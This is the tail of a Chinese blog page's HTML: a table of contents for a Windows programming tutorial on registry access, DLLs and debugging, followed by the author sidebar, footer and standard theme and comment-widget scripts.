class="nav-number">11.3.</span> <span class="nav-text">9.3 注册表编程</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#9-3-1-%E6%B3%A8%E5%86%8C%E8%A1%A8API"><span class="nav-number">11.3.1.</span> <span class="nav-text">9.3.1 注册表API</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#9-3-2-%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%AF%BB%E5%86%99"><span class="nav-number">11.3.2.</span> <span class="nav-text">9.3.2 注册表读写</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-4-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E7%9A%84%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%BA%94%E7%94%A8"><span class="nav-number">11.4.</span> <span class="nav-text">9.4 文件操作的企业级应用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93"><span class="nav-number">12.</span> <span class="nav-text">十 动态链接库</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#10-1-DLL%E6%8A%80%E6%9C%AF%E7%9A%84%E6%A6%82%E5%BF%B5%E5%92%8C%E6%84%8F%E4%B9%89"><span class="nav-number">12.1.</span> <span class="nav-text">10.1 DLL技术的概念和意义</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#10-2-%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93"><span class="nav-number">12.2.</span> <span class="nav-text">10.2 创建一个动态链接库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#10-3-%E8%B0%83%E7%94%A8%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93"><span class="nav-number">12.3.</span> <span class="nav-text">10.3 调用动态链接库</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E4%B8%80-%E6%8A%A5%E9%94%99%E5%A4%84%E7%90%86%E3%80%81%E8%B0%83%E8%AF%95%E6%96%B9%E6%B3%95%E5%8F%8A%E5%85%B6%E4%BB%96"><span class="nav-number">13.</span> <span class="nav-text">十一 报错处理、调试方法及其他</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#11-1-C4996"><span class="nav-number">13.1.</span> <span class="nav-text">11.1 C4996</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#11-2-UDP%E6%9C%8D%E5%8A%A1%E7%AB%AFbind%E9%94%99%E8%AF%AF%E7%9A%84%E8%B0%83%E8%AF%95%E6%96%B9%E6%B3%95"><span class="nav-number">13.2.</span> <span class="nav-text">11.2 UDP服务端bind错误的调试方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#11-3-%E7%A8%8B%E5%BA%8F%E5%86%85%E8%8E%B7%E5%8F%96%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%8F%82%E6%95%B0%E5%87%BA%E9%94%99"><span class="nav-number">13.3.</span> <span class="nav-text">11.3 程序内获取命令行参数出错</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#11-4-windows-h%E5%A4%B4%E6%96%87%E4%BB%B6%E7%9A%84%E9%A6%96%E5%AD%97%E6%AF%8D%E5%A4%A7%E5%86%99"><span class="nav-number">13.4.</span> <span class="nav-text">11.4 windows.h头文件的首字母大写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#11-5-Win-API-%E4%B8%AD%E7%9A%84A-W%E7%89%88%E6%9C%AC%E5%87%BD%E6%95%B0"><span class="nav-number">13.5.</span> <span class="nav-text">11.5 Win API 中的A&#x2F;W版本函数</span></a></li></ol></li></ol></div></div><div class="site-overview-wrap sidebar-panel"><div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="site-author-image" itemprop="image" alt="Moustache" src="/images/180-180.png"><p class="site-author-name" itemprop="name">Moustache</p><div class="site-description" itemprop="description">我是小胡子</div></div><div class="site-state-wrap motion-element"><nav class="site-state"><div class="site-state-item site-state-posts"><a href="/archives/"><span class="site-state-item-count">79</span> <span class="site-state-item-name">日志</span></a></div><div class="site-state-item site-state-categories"><a href="/categories/"><span class="site-state-item-count">9</span> <span class="site-state-item-name">分类</span></a></div><div class="site-state-item site-state-tags"><a href="/tags/"><span class="site-state-item-count">36</span> <span class="site-state-item-name">标签</span></a></div></nav></div><div class="links-of-author motion-element"><span class="links-of-author-item"><a href="https://github.com/hammerzer" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;hammerzer" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a> </span><span class="links-of-author-item"><a href="mailto:stellar_lzu@163.com" title="E-Mail → mailto:stellar_lzu@163.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a></span></div><div class="cc-license motion-element" itemprop="license"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a></div></div><div class="back-to-top motion-element"><i class="fa fa-arrow-up"></i> <span>0%</span></div></div></aside><div id="sidebar-dimmer"></div></div></main><footer class="footer"><div class="footer-inner"><div class="copyright">&copy; <span itemprop="copyrightYear">2025</span> <span class="with-love"><i class="fa fa-heart"></i> </span><span class="author" itemprop="copyrightHolder">Chase</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-chart-area"></i> </span><span class="post-meta-item-text">站点总字数：</span> <span title="站点总字数">1.9m</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-coffee"></i> </span><span class="post-meta-item-text">站点阅读时长 &asymp;</span> <span title="站点阅读时长">29:30</span></div><div class="busuanzi-count"><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span class="post-meta-item" id="busuanzi_container_site_uv" style="display:none"><span class="post-meta-item-icon"><i class="fa fa-user"></i> </span><span class="site-uv" title="总访客量"><span id="busuanzi_value_site_uv"></span> </span></span><span class="post-meta-divider">|</span> <span class="post-meta-item" id="busuanzi_container_site_pv" style="display:none"><span class="post-meta-item-icon"><i class="fa fa-eye"></i> </span><span class="site-pv" title="总访问量"><span id="busuanzi_value_site_pv"></span></span></span></div></div></footer></div><script size="300" alpha="0.4" zindex="-1" src="//cdn.jsdelivr.net/gh/theme-next/theme-next-canvas-ribbon@1/canvas-ribbon.js"></script><script src="/lib/anime.min.js"></script><script src="/lib/velocity/velocity.min.js"></script><script src="/lib/velocity/velocity.ui.min.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/pisces.js"></script><script src="/js/next-boot.js"></script><script src="/js/local-search.js"></script><script>NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/valine@1/dist/Valine.min.js', () => {
    var GUEST = ['nick', 'mail', 'link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item => {
      return GUEST.includes(item);
    });
    new Valine({
      el         : '#valine-comments',
      verify     : false,
      notify     : false,
      appId      : 'JRehDoQ6pHXV1zKg09AMNLFt-gzGzoHsz',
      appKey     : 'cRAt4W15KiQdrIuHlQrRrtIl',
      placeholder: "Just go go",
      avatar     : 'wavatar',
      meta       : guest,
      pageSize   : '10' || 10,
      visitor    : true,
      lang       : '' || 'zh-cn',
      path       : location.pathname,
      recordIP   : true,
      serverURLs : ''
    });
  }, window.Valine);
});</script></body></html>